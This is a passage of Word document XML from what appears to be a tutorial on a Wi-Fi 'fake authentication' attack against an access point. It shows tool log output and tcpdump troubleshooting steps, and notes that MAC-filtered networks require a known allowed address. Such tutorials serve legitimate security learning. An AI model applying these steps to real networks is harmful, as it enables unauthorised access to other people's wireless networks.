          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A8B889" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:28:02  Association</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful :-)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DBC1F76" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:28:02  Got</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>deauthentication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="750FB47A" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:28:05  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="768B9884" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:28:05  Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6466E4E1" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:28:05  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A677F5A" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:28:10  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8D83F3" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:28:10  Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="030BDC78" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="00F37B2B" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:28:10  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00F37B2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79159D3D"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 xml:space="preserve">Notice the “Got a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>deauthentication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet” and the continuous retries </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>above. Do not proceed to the next step until you have the fake authentication running correctly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6869C156" w14:textId="77777777" w:rsidR="00F80E8E" w:rsidRDefault="00F80E8E" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D3E2F76" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Troubleshooting Tips</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65AFADD6" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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 xml:space="preserve">Some access points are configured to only allow selected MAC addresses to associate and connect. If this is the case, you will not be able to successfully do fake authentication unless you know one of the MAC addresses on the allowed list. See the MAC access </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>control troubleshooting</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> tip </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:anchor="troubleshooting_tips" w:history="1">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="107902"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FACE122" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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 xml:space="preserve">If at any time you wish to confirm you are properly associated is to use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> and look at the packets. Start another session and…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46458887"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Run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22EDBC85" w14:textId="77777777" w:rsidR="00540687" w:rsidRDefault="00540687" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74937F34" w14:textId="65D02CB8" w:rsidR="004652D1" w:rsidRPr="008D1EBD" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -n -e -s0 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>vvv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00277615" w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05CE8A7E" w14:textId="77777777" w:rsidR="002A541E" w:rsidRPr="002A541E" w:rsidRDefault="002A541E" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5983D7C3"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 xml:space="preserve">Here is a typical </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> error message you are looking for:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F94701" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 11:04:34.360700 314us BSSID:00:14:6c</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:7e:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> DA:00:09:5B:EC:EE:F2 SA:00:14:6c:7e:40:80   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuthentication</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">: Class 3 frame received from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>nonassociated</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> station</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56EE0F51" w14:textId="77777777" w:rsidR="002A541E" w:rsidRDefault="002A541E" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4325D22C"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Notice that the access point (00:14:6c</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:7e:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>) is telling the source (00:09:5B:EC:EE:F2) you are not associated. Meaning, the AP will not process or accept the injected packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FA3C51C" w14:textId="076FC55E" w:rsidR="002A541E"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 xml:space="preserve">If you want to select only the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>DeAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packets </w:t>
      </w:r>
      <w:r w:rsidR="002A541E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002A541E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="002A541E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> then you can use: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15661103" w14:textId="77777777" w:rsidR="00540687" w:rsidRDefault="00540687" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
